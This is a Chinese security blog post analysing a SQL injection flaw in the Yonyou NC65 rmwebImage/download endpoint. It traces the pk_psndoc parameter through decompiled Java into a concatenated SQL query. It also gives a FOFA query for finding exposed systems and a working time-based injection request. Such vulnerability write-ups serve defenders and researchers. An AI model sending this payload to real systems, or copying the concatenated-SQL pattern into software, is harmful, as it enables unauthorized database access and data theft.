---
title: "用友NC rmwebImage/download sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk_psndoc-sqli.html
asset_dir: assets/用友nc-rmwebimagedownload-sql注入漏洞
---

# 用友NC rmwebImage/download sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/5 08:30
- 879浏览
- [0评论](#comment)
- 2小时阅读

深入探索

服务器

软件

sql

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/rmwebImage/download接口中的 pk\_psndoc 参数实现sql注入，从而窃取服务器的敏感信息。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知SQL注入点在 rmwebImage 接口

[![用友NC rmwebImage/download sql注入漏洞](images/img-001-eedb0e48cd2a.webp)](https://image.mrxn.net/249bfd8371ce4c7586f00c58726e6689.webp)

因此搜索 rmwebImage 方法的实现部分即可定位文件

代码安全审计

modules/hrss/lib/pubhrss\_pub/nc/bs/hrss/pub/action/RMWebImageAction.java

深入探索

计算机安全

VPN服务

安全研究报告

```
package nc.bs.hrss.pub.action;

import com.sun.image.codec.jpeg.JPEGCodec;
import com.sun.image.codec.jpeg.JPEGImageEncoder;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import javax.servlet.ServletOutputStream;
import javax.swing.ImageIcon;
import nc.bs.framework.common.RuntimeEnv;
import nc.bs.hrss.pub.ServiceLocator;
import nc.bs.hrss.pub.exception.HrssException;
import nc.bs.hrss.pub.tool.SessionUtil;
import nc.bs.logging.Logger;
import nc.itf.hi.IPsndocQryService;
import nc.itf.rm.IRMPsndocQueryService;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.vo.bd.pub.SexEnum;
import nc.vo.hi.psndoc.PsndocAggVO;
import nc.vo.hr.tools.formconfig.CodeGenUtils;
import nc.vo.pub.BusinessException;
import nc.vo.rm.psndoc.AggRMPsndocVO;
import nc.vo.rm.psndoc.RMPsndocVO;
import org.apache.commons.io.IOUtils;
import uap.lfw.core.ml.LfwResBundle;

@Servlet(path="/rmwebImage")
public class RMWebImageAction
extends BaseAction {
    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Action
    public void download() {
        ServletOutputStream out = null;
        try {
            byte[] pngBytes = null;
            byte[] pngBytesNew = null;
            Object photo = null;
            FileInputStream fileInput = null;
            this.request.setCharacterEncoding("UTF-8");
            String pk_psndoc = this.request.getParameter("pk_psndoc");
            try {
                IRMPsndocQueryService psndocQryServ = ServiceLocator.lookup(IRMPsndocQueryService.class);
                AggRMPsndocVO aggRMPsndocVO = psndocQryServ.queryByPK(pk_psndoc);
                Object object = photo = aggRMPsndocVO == null ? null : ((RMPsndocVO)aggRMPsndocVO.getParentVO()).getPhoto();
                if (photo == null) {
                    String photoFileName = "photo_defult_male.png";
                    if (SessionUtil.getSessionBean() != null || aggRMPsndocVO != null) {
                        IPsndocQryService psndocQry;
                        PsndocAggVO psndocAggVO;
                        if (null != aggRMPsndocVO && null != aggRMPsndocVO.getParentVO() && null != aggRMPsndocVO.getPsndocVO().getSex() && SexEnum.SEX_FEMAIL.toIntValue() == aggRMPsndocVO.getPsndocVO().getSex().intValue()) {
                            photoFileName = "photo_defult_female.png";
                        }
                        if (aggRMPsndocVO == null && null != (psndocAggVO = (psndocQry = ServiceLocator.lookup(IPsndocQryService.class)).queryPsndocVOByPk(SessionUtil.getPk_psndoc(), false, true)) && null != psndocAggVO.getParentVO() && null != psndocAggVO.getParentVO().getSex() && SexEnum.SEX_FEMAIL.toIntValue() == psndocAggVO.getParentVO().getSex().intValue()) {
                            photoFileName = "photo_defult_female.png";
                        }
                    }
                    String strSrcDir = CodeGenUtils.buildFileURL((String)RuntimeEnv.getInstance().getNCHome(), (String[])new String[]{"hotwebs", "lfw", "frame", "device_pc", "themes", LfwRuntimeEnvironment.getThemeId(), "ext", "hrss", "pub", photoFileName});
                    File file = new File(strSrcDir);
                    fileInput = new FileInputStream(file);
                    pngBytes = new byte[fileInput.available()];
                    fileInput.read(pngBytes);
                } else {
                    pngBytes = (byte[])photo;
                }
                pngBytesNew = RMWebImageAction.transPreviewPhoto(pngBytes, 150, 118);
                this.response.setContentType("image/png");
                out = this.response.getOutputStream();
                out.write(pngBytesNew);
                out.flush();
            }
            catch (HrssException ex) {
                Logger.error((Object)ex.getMessage(), (Throwable)ex);
            }
            catch (BusinessException e) {
                new HrssException(e).alert();
            }
            finally {
                if (fileInput != null) {
                    fileInput.close();
                }
            }
        }
        catch (Exception e) {
            throw new LfwRuntimeException(LfwResBundle.getInstance().getStrByID("c_pub-res", "0c_pub-res0051"), (Throwable)e);
        }
        finally {
            IOUtils.closeQuietly(out);
        }
    }
```

pk\_psndoc 参数直接代入 queryAggRMPsndocVO 函数，其实现逻辑如下

漏洞预警服务

```
private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
    try {
        IRMPsndocQueryService psndocQryServ = (IRMPsndocQueryService)ServiceLocator.lookup(IRMPsndocQueryService.class);
        AggRMPsndocVO aggRMPsndocVO = psndocQryServ.queryByPK(pk_psndoc);
        return aggRMPsndocVO;
    } catch (BusinessException e) {
        (new HrssException(e)).deal();
    } catch (HrssException e) {
        (new HrssException(e)).alert();
    }

    return null;
}
```

继续代入psndocQryServ.queryByPK 函数，其实现逻辑如下

```
public AggRMPsndocVO queryByPK(String pk_psndoc) throws BusinessException {
    return (AggRMPsndocVO)this.getServiceTemplate().queryByPk(AggRMPsndocVO.class, pk_psndoc);
}
```

继续跟踪 getServiceTemplate().queryByPk 函数，这里注意 传入的第三个参数为 false

计算机服务器

```
public <T> T queryByPk(Class<T> clazz, String pk) throws BusinessException {
    return (T)this.queryByPk(clazz, pk, false);
}
public <T> T queryByPk(Class<T> clazz, String pk, boolean lazyLoad2) throws BusinessException {
    try {
        return (T)getMDQueryService().queryBillOfVOByPK(clazz, pk, lazyLoad2);
    } catch (MetaDataException e) {
        Logger.error(e.getMessage(), e);
        throw new BusinessException(ResHelper.getString("6001frame", "06001frame0153"), e);
    }
}
```

继续跟踪 getMDQueryService().queryBillOfVOByPK 函数

```
public <T> T queryBillOfVOByPK(Class<T> voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
    return (T)(new MDBaseDAO()).queryBillOfVOByPK(voClass, billPK, bLazyLoad);
}
```

pk\_psndoc ==>pk ==>billPK 又代入 (new MDBaseDAO()).queryBillOfVOByPK 函数

SQL注入防护

```
public Object queryBillOfVOByPK(Class voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
    NCObject ncObj = (new VOQueryPersister(voClass.getName())).queryBillImp(billPK, bLazyLoad);
    if (ncObj == null) {
        return null;
    } else {
        return AggregatedValueObject.class.isAssignableFrom(voClass) ? ncObj.getContainmentObject() : ncObj.getModelConsistObject();
    }
}
```

billPK 继续代入 queryBillImp 函数

```
protected NCObject queryBillImp(String billPK, boolean bLazyLoad) throws MetaDataException {
    NCObject resNCObj = null;

    try {
        Object resVO = this.dao.retrieveByPK(billPK, this.ignoreDrEqual1);
        if (resVO == null) {
            return null;
        } else {
            resNCObj = NCObject.newInstance(this.relatedEntity, resVO);
            if (!bLazyLoad) {
                this.queryChildrenVOSByParentObjs(new NCObject[]{resNCObj}, bLazyLoad, (Map)null, (String)null);
            }

            return resNCObj;
        }
    } catch (Exception e) {
        Logger.error("fail to query data", e);
        throw new MetaDataException("operation failed** baseDao.retrieveByPK," + e.getMessage());
    }
}
```

继续跟踪 retrieveByPK 函数

搜索引擎

```
public Object retrieveByPK(String pkValue, boolean ignoreDrEqual1) throws MetaDataException {
    if (this.metaCollection != null && this.metaCollection.size() != 0) {
        String whereConStr = "";
        whereConStr = (String)this.tableAliasMap.get(this.bean.getTable().getName()) + "." + this.bean.getTable().getPrimaryKeyName() + "='" + pkValue + "'";
        if (ignoreDrEqual1) {
            whereConStr = whereConStr + " and isnull(" + this.bean.getTable().getName() + ".dr,0)=0 ";
        }

        List<E> beanList = this.retrieveByClouse(whereConStr, (String[])null, false);
        return beanList != null && beanList.size() > 0 ? beanList.get(0) : null;
    } else {
        return null;
    }
}

public List<E> retrieveByClouse(String whereCondStr, String[] filtAttrNames, boolean ignoreDrEqual1) throws MetaDataException {
    String resultSql = this.generateSql(whereCondStr, filtAttrNames, (String)null, (String)null, ignoreDrEqual1);
    List<E> beanList = null;

    try {
        beanList = (List)(new BaseDAO()).executeQuery(resultSql, new BeanListFromColumnLableProcessor(Class.forName(this.bean.getFullClassName()), this.bean));
        return beanList;
    } catch (Exception e) {
        throw new MetaDataException(NCLangResOnserver.getInstance().getStrByID("mdbusi", "mdMultiTableDAO-0001") + resultSql + "####type:" + this.bean.getName() + "#$#$#" + e.getMessage(), e);
    }
}
```

至此，最终 pk\_psndoc 参数拼接进SQL语句里，ignoreDrEqual1 在前面已经定义传入的为 false ，而 generateSql 函数的作用是组装SQL语句

编程

[![用友NC rmwebImage/download sql注入漏洞](images/img-002-e9e9638bcfbc.webp)](https://image.mrxn.net/b3e397c997d748928687a42f4caf1ac0.webp)

最终调用 (new BaseDAO()).executeQuery 执行上面组合后的SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

可先通过如下请求来确定目标是否存在此接口及其响应，如果存在此模块，则会响应一个图片内容

```
GET /portal/pt/rmwebImage/download?pageId=login&pk_psndoc=1 HTTP/1.1
Host: nc65.mrxn.net
```

漏洞利用示例

漏洞预警服务

```
GET /portal/pt/rmwebImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)-- HTTP/1.1
HTTP/1.1
Host: nc65.mrxn.net
```

[![用友NC rmwebImage/download sql注入漏洞](images/img-003-88395734dea4.webp)](https://image.mrxn.net/a02e453c7e9a49608b7b2e54f71e71d9.webp)

成功延时 5 秒

黑客与破解

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=676`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

文件大小转换
